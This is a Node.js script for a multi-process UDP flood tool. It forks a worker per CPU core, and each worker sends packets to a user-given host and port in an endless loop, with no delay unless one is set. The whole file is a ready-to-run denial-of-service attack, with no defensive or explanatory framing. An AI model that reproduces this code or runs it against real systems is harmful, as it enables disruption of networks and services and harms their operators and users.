var dgram = require("dgram"),
    Commander  = require('commander'),
    cluster = require('cluster'),
    os = require('os'),
    idleGC = require('idle-gc'),
    q = require('q');

var commander = Commander
  .option('-h, --host <host>', 'Host Name/IP.', String)
  .option('-w, --workers <workers>', 'Number of workers to fork in the cluster, default is CPU count.', parseInt)
  .option('-p, --port <port>', 'If not defined, program will use random ports.', parseInt)
  .option('-d, --delay <delay>', 'Delay in ms between packet sending (per worker). Defaults to 0.', parseInt)
  .option('-t, --data <data>', 'Optional data to send. Default (ICMP ping packet) is used if not specified.', String)
  .option('-s, --silent', 'Silences printing the sent packet count on each cluster.')
  .parse(process.argv);
  
require('./q-flow');

var port = commander.port || Math.floor(Math.random() * (65553) + 1);
var workers = commander.workers || os.cpus().length + 1;

var client = dgram.createSocket({type:'udp4',reuseAddr:true});

client.on("error", function (err) {
  console.error("UDP error:\n" + err.stack);
  client.close();
  process.exit(1);
});

client.bind(port);



function sendOne(ip, port){
  return new Promise(function(resolve, reject){
    
    var msg = new Buffer ([]);

    if(commander.data){
      // custom msg
      msg = new Buffer(commander.data);

    }else{
      // ICMP ping packet.
      msg = new Buffer ([
        0x08, 0x00, 0x43, 0x52, 0x00, 0x01, 0x0a, 0x09,
        0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
        0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70,
        0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x61,
        0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69]);
    }
        
    client.send(msg, 0, msg.length, port, ip, function(err){
      return err ? reject(err) : resolve();
    });

  });
}

function runWorker(){
  idleGC.start(5000);
  var packetsSent = 0;
  console.log('Flooding', commander.host, 'with UDP packets on port', port);
  // Small timeout to read the msg above before packet counts print to console.
  setTimeout(function(){
    q.until(function() {
      return q.delay(commander.delay || 0)
      .then(function(){
        return sendOne(commander.host, port);
      })
      .then(function() {
        packetsSent++;
        if(!commander.silent){ 
          if(commander.data){
            console.log('custom packets sent', packetsSent);
          }else{
            console.log('packets sent', packetsSent);
          }
        }
        return false;
      });
    }).done(function() {
      return console.log('done');
    });
  }, 3000);
}
if(!commander.host) return console.log('No host specified. Exiting.');

if(cluster.isMaster){
  for (var i = 0; i < workers; i++) {
    console.log('Started worker', i + 1);
    cluster.fork();
  }
  
  cluster.on('exit', function(worker, code, signal) {
    console.log('Worker ' + worker.process.pid + ' died');
  });
  
}else{
  runWorker();
}
